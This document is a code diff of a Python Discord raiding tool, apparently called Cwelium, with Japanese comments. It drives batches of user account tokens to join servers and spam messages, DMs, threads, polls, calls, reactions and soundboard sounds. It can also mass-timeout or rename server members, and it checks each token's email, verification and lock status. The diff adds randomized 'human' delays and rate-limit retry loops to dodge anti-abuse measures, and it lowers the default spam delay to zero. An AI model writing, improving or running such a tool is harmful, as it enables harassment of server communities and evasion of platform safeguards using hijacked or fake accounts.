+                for attempt in range(max_retries + 1):
+                    try:
+                        self.human_delay()
+                        headers = self.headers_full(token)
+                        headers["X-Context-Properties"] = context
+                        payload = {"session_id": uuid.uuid4().hex}
+                        resp = self._request("POST", f"https://discord.com/api/v9/invites/{invite}",
+                                             token, headers=headers, json=payload, timeout=10)
+                        if resp.status_code == 200:
+                            console.log("Joined", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_name)
+                            return
+                        elif resp.status_code == 400:
+                            console.log("Captcha", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Captcha detected - skipping this token")
+                            return
+                        elif resp.status_code == 429:
+                            wait = resp.json().get('retry_after', 30) + random.uniform(0, 10)
+                            console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Rate limited, waiting {wait:.1f}s")
+                            time.sleep(wait)
+                            if attempt < max_retries:
+                                continue
+                            else:
+                                return
                         else:
-                            console.log("Captcha Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                    elif resp.status_code == 429:
-                        console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Rate limited, waiting...")
-                        time.sleep(random.uniform(10, 20))
-                    else:
-                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message", "Unknown error"))
-                except Exception as e:
-                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
+                            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message", "Unknown error"))
+                            return
+                    except Exception as e:
+                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
+                        return
+                console.log("Skipped", C["gray"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", "Max retries reached")
             args = [(token,) for token in tokens]
             Menu().run(join_server, args)
         except Exception as e:
@@ -912,14 +1177,12 @@ class Raider:
             input()
             Menu().main_menu()
 
+    # ========== 以下、他の全機能（強化済み） ==========
     def leaver(self, token, guild):
         try:
             def get_guild_name(guild):
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/guilds/{guild}",
-                    headers=self.headers_full(token),
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild}",
+                                     token, headers=self.headers_full(token), timeout=10)
                 if resp.status_code == 200:
                     try:
                         return resp.json()["name"]
@@ -928,16 +1191,15 @@ class Raider:
                 return guild
             self.guild = get_guild_name(guild)
             payload = {"lurking": False}
-            resp = global_session.delete(
-                f"https://discord.com/api/v9/users/@me/guilds/{guild}",
-                json=payload,
-                headers=self.headers_full(token),
-                timeout=10
-            )
+            resp = self._request("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{guild}",
+                                 token, headers=self.headers_full(token), json=payload, timeout=10)
             if resp.status_code == 204:
                 console.log("Left", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", self.guild)
             elif resp.status_code == 429:
-                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                wait = resp.json().get('retry_after', 5)
+                console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"wait {wait}s")
+                time.sleep(wait)
+                self.leaver(token, guild)
             else:
                 console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
         except Exception as e:
@@ -1022,19 +1284,13 @@ class Raider:
     def join_voice_channel(self, token, guild_id, channel_id):
         ws = websocket.WebSocket()
         def check_for_guild(token):
-            resp = global_session.get(
-                f"https://discord.com/api/v9/guilds/{guild_id}",
-                headers=self.headers_full(token),
-                timeout=10
-            )
+            resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}",
+                                 token, headers=self.headers_full(token), timeout=10)
             return resp.status_code == 200
         def check_for_channel(token):
             if check_for_guild(token):
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/channels/{channel_id}",
-                    headers=self.headers_full(token),
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/channels/{channel_id}",
+                                     token, headers=self.headers_full(token), timeout=10)
                 return resp.status_code == 200
             return False
         if check_for_channel(token):
@@ -1045,12 +1301,9 @@ class Raider:
 
     def soundbord(self, token, channel):
         try:
-            sounds = global_session.get(
-                "https://discord.com/api/v9/soundboard-default-sounds",
-                headers=self.headers_full(token),
-                timeout=10
-            ).json()
-            time.sleep(1)
+            sounds = self._request("GET", "https://discord.com/api/v9/soundboard-default-sounds",
+                                   token, headers=self.headers_full(token), timeout=10).json()
+            self.human_delay()
             while True:
                 sound = random.choice(sounds)
                 payload = {
@@ -1058,33 +1311,25 @@ class Raider:
                     "emoji_name": sound["emoji_name"],
                     "sound_id": sound["sound_id"],
                 }
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound",
-                    headers=self.headers_full(token),
-                    json=payload,
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/channels/{channel}/send-soundboard-sound",
+                                     token, headers=self.headers_full(token), json=payload, timeout=10)
                 if resp.status_code == 204:
                     console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Played {sound['name']}")
                 elif resp.status_code == 429:
                     retry_after = resp.json()["retry_after"]
-                    console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
+                    console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s")
                     time.sleep(float(retry_after))
                 else:
                     break
-                time.sleep(random.uniform(0.56, 0.75))
+                self.human_delay()
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
     def open_dm(self, token, user_id):
         try:
             payload = {"recipients": [f'{user_id}']}
-            resp = global_session.post(
-                "https://discord.com/api/v9/users/@me/channels",
-                headers=self.headers_full(token),
-                json=payload,
-                timeout=10
-            )
+            resp = self._request("POST", "https://discord.com/api/v9/users/@me/channels",
+                                 token, headers=self.headers_full(token), json=payload, timeout=10)
             if resp.status_code == 200:
                 return resp.json()["id"]
             else:
@@ -1101,12 +1346,8 @@ class Raider:
                 if not channel_id:
                     return
                 json_data = {'recipients': None}
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/channels/{channel_id}/call",
-                    headers=self.headers_full(token),
-                    json=json_data,
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/channels/{channel_id}/call",
+                                     token, headers=self.headers_full(token), json=json_data, timeout=10)
                 if resp.status_code == 200:
                     console.log("Called", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                     ws = websocket.WebSocket()
@@ -1114,7 +1355,7 @@ class Raider:
                 else:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                     return
-                time.sleep(5)
+                self.human_delay()
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -1125,18 +1366,14 @@ class Raider:
                 return
             while True:
                 payload = {"content": message, "nonce": str(self.nonce())}
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
-                    headers=self.headers_full(token),
-                    json=payload,
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                                     token, headers=self.headers_full(token), json=payload, timeout=10)
                 if resp.status_code == 200:
                     console.log("Send", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", user_id)
                 else:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                     break
-                time.sleep(7)
+                self.human_delay()
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
@@ -1162,16 +1399,15 @@ class Raider:
     def bio_changer(self, token, bio):
         try:
             payload = {"bio": bio}
-            resp = global_session.patch(
-                "https://discord.com/api/v9/users/@me/profile",
-                headers=self.headers_full(token),
-                json=payload,
-                timeout=10
-            )
+            resp = self._request("PATCH", "https://discord.com/api/v9/users/@me/profile",
+                                 token, headers=self.headers_full(token), json=payload, timeout=10)
             if resp.status_code == 200:
                 console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
             elif resp.status_code == 429:
-                console.log("Cloudflare", C["magenta"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
+                wait = resp.json().get('retry_after', 5)
+                console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"wait {wait}s")
+                time.sleep(wait)
+                self.bio_changer(token, bio)
             else:
                 console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
         except Exception as e:
@@ -1180,12 +1416,8 @@ class Raider:
     def mass_nick(self, token, guild, nick):
         try:
             payload = {"nick": nick}
-            resp = global_session.patch(
-                f"https://discord.com/api/v9/guilds/{guild}/members/@me",
-                headers=self.headers_full(token),
-                json=payload,
-                timeout=10
-            )
+            resp = self._request("PATCH", f"https://discord.com/api/v9/guilds/{guild}/members/@me",
+                                 token, headers=self.headers_full(token), json=payload, timeout=10)
             if resp.status_code == 200:
                 console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
             else:
@@ -1202,36 +1434,30 @@ class Raider:
                 "location": "Thread Browser Toolbar",
             }
             while True:
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
-                    headers=self.headers_full(token),
-                    json=payload,
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/channels/{channel_id}/threads",
+                                     token, headers=self.headers_full(token), json=payload, timeout=10)
                 if resp.status_code == 201:
                     console.log("Created", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                 elif resp.status_code == 429:
                     retry_after = resp.json()["retry_after"]
                     if int(retry_after) > 10:
-                        console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
+                        console.log("Stopped", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s")
                         break
                     else:
-                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
+                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s")
                         time.sleep(float(retry_after))
                 else:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", resp.json().get("message"))
                     break
+                self.human_delay()
         except Exception as e:
             console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
     def typier(self, token, channel_id):
         try:
             while True:
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/channels/{channel_id}/typing",
-                    headers=self.headers_full(token),
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/channels/{channel_id}/typing",
+                                     token, headers=self.headers_full(token), timeout=10)
                 if resp.status_code == 204:
                     console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                     time.sleep(9)
@@ -1244,12 +1470,8 @@ class Raider:
     def friender(self, token, nickname):
         try:
             payload = {"username": nickname, "discriminator": None}
-            resp = global_session.post(
-                f"https://discord.com/api/v9/users/@me/relationships",
-                headers=self.headers_full(token),
-                json=payload,
-                timeout=10
-            )
+            resp = self._request("POST", "https://discord.com/api/v9/users/@me/relationships",
+                                 token, headers=self.headers_full(token), json=payload, timeout=10)
             if resp.status_code == 204:
                 console.log("Success", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
             elif resp.status_code == 400:
@@ -1263,17 +1485,14 @@ class Raider:
         def main_checker(token):
             try:
                 while True:
-                    resp = global_session.get(
-                        f"https://discord.com/api/v9/guilds/{guild_id}",
-                        headers=self.headers_full(token),
-                        timeout=10
-                    )
+                    resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}",
+                                         token, headers=self.headers_full(token), timeout=10)
                     if resp.status_code == 200:
                         console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                         break
                     elif resp.status_code == 429:
                         retry_after = resp.json()["retry_after"]
-                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
+                        console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s")
                         time.sleep(float(retry_after))
                     else:
                         console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
@@ -1288,11 +1507,8 @@ class Raider:
         def main(token):
             try:
                 while True:
-                    resp = global_session.get(
-                        "https://discordapp.com/api/v9/users/@me/library",
-                        headers=self.headers_full(token),
-                        timeout=10
-                    )
+                    resp = self._request("GET", "https://discordapp.com/api/v9/users/@me/library",
+                                         token, headers=self.headers_full(token), timeout=10)
                     if resp.status_code == 200:
                         console.log("Valid", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                         valid.append(token)
@@ -1320,11 +1536,8 @@ class Raider:
         try:
             valid = []
             for token in tokens:
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/member-verification",
-                    headers=self.headers_full(token),
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/member-verification",
+                                     token, headers=self.headers_full(token), timeout=10)
                 if resp.status_code == 200:
                     valid.append(token)
                     payload = resp.json()
@@ -1336,12 +1549,8 @@ class Raider:
                 return
             def run_main(token):
                 try:
-                    resp = global_session.put(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
-                        headers=self.headers_full(token),
-                        json=payload,
-                        timeout=10
-                    )
+                    resp = self._request("PUT", f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
+                                         token, headers=self.headers_full(token), json=payload, timeout=10)
                     if resp.status_code == 201:
                         console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                     else:
@@ -1357,11 +1566,8 @@ class Raider:
         try:
             master_token = None
             for token in tokens:
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
-                    headers=self.headers_full(token),
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
+                                     token, headers=self.headers_full(token), timeout=10)
                 if resp.status_code == 200:
                     onboarding_data = resp.json()
                     master_token = token
@@ -1395,12 +1601,8 @@ class Raider:
                     "onboarding_prompts_seen": t_prompts_seen,
                     "onboarding_responses_seen": t_options_seen,
                 }
-                resp = global_session.post(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
-                    headers=self.headers_full(token),
-                    json=payload,
-                    timeout=10
-                )
+                resp = self._request("POST", f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
+                                     token, headers=self.headers_full(token), json=payload, timeout=10)
                 if resp.status_code == 200:
                     console.log("Accepted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                 else:
@@ -1418,12 +1620,8 @@ class Raider:
             emojis = []
             params = {"around": message_id, "limit": 50}
             for token in tokens:
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
-                    headers=self.headers_full(token),
-                    params=params,
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                                     token, headers=self.headers_full(token), params=params, timeout=10)
                 if resp.status_code == 200:
                     access_token = token
                     break
@@ -1459,7 +1657,7 @@ class Raider:
             def add_reaction(token):
                 try:
                     url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{selected}/@me"
-                    resp = global_session.put(url, headers=self.headers_full(token), timeout=10)
+                    resp = self._request("PUT", url, token, headers=self.headers_full(token), timeout=10)
                     if resp.status_code == 204:
                         console.log("Reacted", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", selected)
                     else:
@@ -1479,12 +1677,8 @@ class Raider:
             buttons = []
             params = {"around": message_id, "limit": 50}
             for token in tokens:
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/channels/{channel_id}/messages",
-                    headers=self.headers_full(token),
-                    params=params,
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/channels/{channel_id}/messages",
+                                     token, headers=self.headers_full(token), params=params, timeout=10)
                 if resp.status_code == 200:
                     access_token = token
                     break
@@ -1533,12 +1727,8 @@ class Raider:
                         "session_id": uuid.uuid4().hex,
                         "type": 3,
                     }
-                    resp = global_session.post(
-                        "https://discord.com/api/v9/interactions",
-                        headers=self.headers_full(token),
-                        json=payload,
-                        timeout=10
-                    )
+                    resp = self._request("POST", "https://discord.com/api/v9/interactions",
+                                         token, headers=self.headers_full(token), json=payload, timeout=10)
                     if resp.status_code == 204:
                         console.log("Clicked", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", btn["label"])
                     else:
@@ -1571,16 +1761,12 @@ class Raider:
                     }
                 }))
                 ws.close()
-                global_session.patch(
-                    "https://discord.com/api/v9/users/@me/settings",
-                    headers=self.headers_full(token),
-                    json={"custom_status": None},
-                    timeout=10
-                )
+                self._request("PATCH", "https://discord.com/api/v9/users/@me/settings",
+                              token, headers=self.headers_full(token), json={"custom_status": None}, timeout=10)
                 console.log("Cleared", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
             except Exception as e:
                 console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
-            time.sleep(0.5)
+            self.human_delay()
 
     def keep_online(self, token):
         while True:
@@ -1616,12 +1802,8 @@ class Raider:
                 params = {"limit": 1000}
                 if after:
                     params["after"] = after
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/members",
-                    headers=self.headers_full(token),
-                    params=params,
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members",
+                                     token, headers=self.headers_full(token), params=params, timeout=10)
                 if resp.status_code != 200:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"メンバー取得失敗 ({resp.status_code})")
                     return
@@ -1640,24 +1822,16 @@ class Raider:
             def timeout_member(member):
                 user_id = member["user"]["id"]
                 try:
-                    r = global_session.patch(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
-                        headers=self.headers_full(token),
-                        json={"communication_disabled_until": timeout_until},
-                        timeout=10
-                    )
+                    r = self._request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
+                                      token, headers=self.headers_full(token), json={"communication_disabled_until": timeout_until}, timeout=10)
                     if r.status_code == 200:
                         console.log("Timeout", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']}")
                     elif r.status_code == 429:
                         retry_after = r.json().get("retry_after", 5)
                         console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"wait {retry_after:.2f}s")
                         time.sleep(retry_after)
-                        r2 = global_session.patch(
-                            f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
-                            headers=self.headers_full(token),
-                            json={"communication_disabled_until": timeout_until},
-                            timeout=10
-                        )
+                        r2 = self._request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
+                                           token, headers=self.headers_full(token), json={"communication_disabled_until": timeout_until}, timeout=10)
                         if r2.status_code == 200:
                             console.log("Timeout", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} (retry)")
                         else:
@@ -1680,12 +1854,8 @@ class Raider:
                 params = {"limit": 1000}
                 if after:
                     params["after"] = after
-                resp = global_session.get(
-                    f"https://discord.com/api/v9/guilds/{guild_id}/members",
-                    headers=self.headers_full(token),
-                    params=params,
-                    timeout=10
-                )
+                resp = self._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/members",
+                                     token, headers=self.headers_full(token), params=params, timeout=10)
                 if resp.status_code != 200:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"メンバー取得失敗 ({resp.status_code})")
                     return
@@ -1703,24 +1873,16 @@ class Raider:
             def change_nick(member):
                 user_id = member["user"]["id"]
                 try:
-                    r = global_session.patch(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
-                        headers=self.headers_full(token),
-                        json={"nick": new_nick},
-                        timeout=10
-                    )
+                    r = self._request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
+                                      token, headers=self.headers_full(token), json={"nick": new_nick}, timeout=10)
                     if r.status_code == 200:
                         console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} -> {new_nick}")
                     elif r.status_code == 429:
                         retry_after = r.json().get("retry_after", 5)
                         console.log("Ratelimit", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"wait {retry_after:.2f}s")
                         time.sleep(retry_after)
-                        r2 = global_session.patch(
-                            f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
-                            headers=self.headers_full(token),
-                            json={"nick": new_nick},
-                            timeout=10
-                        )
+                        r2 = self._request("PATCH", f"https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}",
+                                           token, headers=self.headers_full(token), json={"nick": new_nick}, timeout=10)
                         if r2.status_code == 200:
                             console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"@{member['user']['username']} -> {new_nick} (retry)")
                         else:
@@ -1735,9 +1897,66 @@ class Raider:
         except Exception as e:
             console.log("Error", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
+    # ========== トークン品質チェック ==========
+    def token_quality_check(self):
+        console.clear()
+        console.render_ascii()
+        console.title("Cwelium - Token Quality Check")
+        console.log("Checking", C["yellow"], False, "Token quality analysis...")
+        results = []
+        for token in tokens:
+            try:
+                resp = self._request("GET", "https://discord.com/api/v9/users/@me",
+                                     token, headers=self.headers_minimal(token), timeout=10)
+                if resp.status_code == 200:
+                    user = resp.json()
+                    guild_resp = self._request("GET", "https://discord.com/api/v9/users/@me/guilds",
+                                               token, headers=self.headers_minimal(token), timeout=10)
+                    guild_count = len(guild_resp.json()) if guild_resp.status_code == 200 else 0
+                    lib_resp = self._request("GET", "https://discord.com/api/v9/users/@me/library",
+                                             token, headers=self.headers_minimal(token), timeout=10)
+                    locked = (lib_resp.status_code == 403)
+                    results.append({
+                        "token": token[:25] + "...",
+                        "username": user.get("username", "Unknown"),
+                        "verified": user.get("verified", False),
+                        "email": user.get("email", "None"),
+                        "guilds": guild_count,
+                        "locked": locked,
+                        "status": "Valid"
+                    })
+                elif resp.status_code == 401:
+                    results.append({"token": token[:25] + "...", "status": "Invalid (401)"})
+                elif resp.status_code == 403:
+                    results.append({"token": token[:25] + "...", "status": "Locked (403)"})
+                else:
+                    results.append({"token": token[:25] + "...", "status": f"Unknown ({resp.status_code})"})
+                self.human_delay()
+            except Exception as e:
+                results.append({"token": token[:25] + "...", "status": f"Error: {e}"})
+        console.clear()
+        console.render_ascii()
+        print(f"\n{C['cyan']}【 Token Quality Report 】{C['white']}\n")
+        for res in results:
+            if "Valid" in res.get("status", ""):
+                status_color = C["green"]
+                extra = f" | @{res.get('username','')} | Verified:{res.get('verified',False)} | Guilds:{res.get('guilds',0)} | Locked:{res.get('locked',False)}"
+            elif "Invalid" in res.get("status", ""):
+                status_color = C["red"]
+                extra = ""
+            elif "Locked" in res.get("status", ""):
+                status_color = C["yellow"]
+                extra = ""
+            else:
+                status_color = C["gray"]
+                extra = ""
+            console.log(res["status"], status_color, res["token"], extra)
+        input(f"\n   {console.background}~/> press enter to continue ")
+        Menu().main_menu()
+
 
 # ============================================================================
-#  Menu クラス
+#  Menu クラス（全機能メニュー）
 # ============================================================================
 class Menu:
     def __init__(self):
@@ -1758,7 +1977,9 @@ class Menu:
             "14": self.soundbord, "15": self.nick_changer, "16": self.Thread_Spammer,
             "17": self.typier, "19": self.caller, "20": self.bio_changer, "21": self.voice_joiner,
             "22": self.onboard, "23": self.dm_spam, "24": self.exits, "25": self.poll_spammer,
-            "26": self.mass_timeout, "27": self.mass_nick_all, "32": self.token_quality,
+            "26": self.mass_timeout, "27": self.mass_nick_all, "28": self.schedule_spam,
+            "32": self.token_quality, "33": self.status_manager, "34": self.advanced_reaction,
+            "35": self.repeat_schedule,
             "h": self.show_help, "H": self.show_help, "~": self.credit,
         }
 
@@ -1778,14 +1999,6 @@ class Menu:
         console.clear()
         console.render_ascii()
         for idx, arg in enumerate(args):
-            if proxy and proxies:
-                selected_proxy = proxies[idx % len(proxies)]
-                global_session.proxies = {
-                    "http": f"http://{selected_proxy}",
-                    "https": f"http://{selected_proxy}"
-                }
-            else:
-                global_session.proxies = {}
             thread = threading.Thread(target=func, args=arg, daemon=True)
             threads.append(thread)
             thread.start()
@@ -1819,14 +2032,6 @@ class Menu:
         listener.start()
         threads = []
         for idx, arg in enumerate(args):
-            if proxy and proxies:
-                selected_proxy = proxies[idx % len(proxies)]
-                global_session.proxies = {
-                    "http": f"http://{selected_proxy}",
-                    "https": f"http://{selected_proxy}"
-                }
-            else:
-                global_session.proxies = {}
             t = threading.Thread(target=func, args=arg, daemon=True)
             threads.append(t)
             t.start()
@@ -1845,6 +2050,7 @@ class Menu:
         input(f"\n   {self.background}~/> press enter to continue ")
         self.main_menu()
 
+    # ========== 各メニュー機能 ==========
     def get_message_from_file_or_input(self):
         msg_dir = "data/messages"
         if not os.path.exists(msg_dir):
@@ -1895,11 +2101,8 @@ class Menu:
             found = False
             for token in tokens:
                 try:
-                    resp = global_session.get(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/channels",
-                        headers=self.raider.headers_full(token),
-                        timeout=10
-                    )
+                    resp = self.raider._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels",
+                                                token, headers=self.raider.headers_full(token), timeout=10)
                     if resp.status_code == 200:
                         channels = resp.json()
                         text_channels = [c for c in channels if c.get('type') == 0]
@@ -1922,11 +2125,8 @@ class Menu:
             first_text_channel = None
             for token in tokens:
                 try:
-                    resp = global_session.get(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/channels",
-                        headers=self.raider.headers_full(token),
-                        timeout=10
-                    )
+                    resp = self.raider._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels",
+                                                token, headers=self.raider.headers_full(token), timeout=10)
                     if resp.status_code == 200:
                         channels = resp.json()
                         text_channels = [c for c in channels if c.get('type') == 0]
@@ -1948,7 +2148,7 @@ class Menu:
                 }
                 console.log("Poll", C["green"], False, "質問: 'Raid by Masumani', 選択肢: join, now, discord.gg/, msmn")
             pings = int(input(console.prompt("Pings amount (0推奨)")) or "0")
-            delay = float(input(console.prompt("Delay between cycles (秒, 3〜5推奨)")) or "3")
+            delay = float(input(console.prompt("Delay between cycles (秒, 推奨: 0〜5)")) or "0")
             valid_tokens = self.raider.get_valid_tokens_for_guild(guild_id)
             if not valid_tokens:
                 console.log("Failed", C["red"], "対象サーバーに参加しているトークンがありません。")
@@ -2000,16 +2200,6 @@ class Menu:
             self.run_spammer(self.raider.spammer, args)
 
     @wrapper
-    def clear_status(self):
-        console.title("Cwelium - Clear Status")
-        self.run(self.raider.clear_activity, [()])
-
-    def onliner(self):
-        console.title("Cwelium - Onliner")
-        args = [(token,) for token in tokens]
-        self.run(self.raider.keep_online, args)
-
-    @wrapper
     def poll_spammer(self):
         console.title("Cwelium - Poll Spammer")
         console.log("Info", C["yellow"], False, "事前に [04] Token Checker を推奨します。")
@@ -2021,11 +2211,8 @@ class Menu:
             console.log("Fetching channel list...", C["yellow"])
             for token in tokens:
                 try:
-                    resp = global_session.get(
-                        f"https://discord.com/api/v9/guilds/{guild_id}/channels",
-                        headers=self.raider.headers_full(token),
-                        timeout=10
-                    )
+                    resp = self.raider._request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/channels",
+                                                token, headers=self.raider.headers_full(token), timeout=10)
                     if resp.status_code == 200:
                         channels = resp.json()
                         text_channels = [c for c in channels if c.get('type') == 0]
